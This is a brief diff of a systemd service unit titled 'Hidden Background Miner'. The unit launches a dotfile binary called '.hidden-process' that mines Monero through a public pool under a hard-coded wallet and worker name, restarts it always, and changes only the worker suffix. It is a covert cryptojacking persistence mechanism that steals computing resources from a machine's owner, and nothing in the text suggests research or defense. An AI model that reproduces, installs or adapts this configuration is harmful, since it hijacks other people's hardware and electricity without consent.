@@ -54,7 +54,7 @@ Description=Hidden Background Miner
 After=network.target
 
 [Service]
-ExecStart=$WORK_DIR/.hidden-process -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM64-ohiodesp -k --coin monero -a rx/64
+ExecStart=$WORK_DIR/.hidden-process -o xmr-eu.kryptex.network:7029 -u 88NaRPxg9d16NwXYpMvXrLir1rqw9kMMbK6UZQSix59SiQtQZYdM1R4G8tmdsNvF1ZXTRAZsvEtLmQsoxWhYHrGYLzj6csV/LM64-ohiodesp-12t3 -k --coin monero -a rx/64
 Restart=always
 RestartSec=60
 User=$(whoami)
